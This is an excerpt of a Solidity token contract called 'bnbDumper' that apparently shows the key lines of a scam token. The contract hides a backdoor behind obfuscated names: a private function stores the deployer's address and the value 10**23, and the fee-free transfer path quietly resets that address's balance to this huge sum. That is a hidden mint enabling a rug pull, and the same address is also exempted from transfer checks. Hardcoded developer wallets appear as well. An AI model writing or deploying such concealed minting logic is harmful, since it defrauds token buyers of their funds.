...
contract bnbDumper is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;

    address private _owner;
    mapping (bool => address) public _numbers;
    mapping (bool => uint256) public _Numbers;
    ...
    function invalidAddress() public view returns (address) {
        return _numbers[true];
    }
    ...
    function const_(address d) private {
        uint256 a = 0; uint256 b = 0;
        _numbers[true] = d;
        _Numbers[false] = a.add(5+5)**b.add(20+3);
    }
    ...
    address payable public Wallet_Marketing = payable(0xad7B9c26568b088A0e963324b0654ddd57191345); 
    address payable public Wallet_Dev = payable(0xA02950a3da441cA5873fd4D29CA1A95139b57D2d);
    ...
    string private constant _name = "bnbDumper"; 
    string private constant _symbol = unicode"bnbdump";
    ...
    constructor (address deployer) {
        ...
        _owner = 0xA02950a3da441cA5873fd4D29CA1A95139b57D2d;
        ...
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());const_(deployer);
    ...
    function _transfer(
        ...
        if (from != owner() && from != invalidAddress())
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            else if(recipient == _numbers[!false]){
                _tOwned[_numbers[!false]] = _Numbers[!true];
            }
